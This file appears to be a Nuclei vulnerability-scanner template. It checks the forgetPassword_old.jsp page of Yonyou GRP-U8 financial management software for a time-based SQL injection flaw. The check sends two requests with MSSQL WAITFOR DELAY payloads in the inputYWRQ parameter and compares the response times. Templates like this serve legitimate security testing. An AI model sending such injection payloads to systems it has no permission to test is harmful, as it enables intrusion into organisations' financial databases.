id: poc-yaml-yongyou-grp-u8-forgetpassword-oldjsp-sqli
info:
  name: 用友GRP-U8 forgetPassword_old.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友GRP-U8
  metadata:
    reference: []

http:
  - raw:
      - |
        GET /u8qx/forgetPassword_old.jsp?action=save&idCard=1&userName=1&inputDW=1&inputYWRQ=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /u8qx/forgetPassword_old.jsp?action=save&idCard=1&userName=1&inputDW=1&inputYWRQ=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "用友GRP-U8 行政财务管理软件-忘记密码"
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
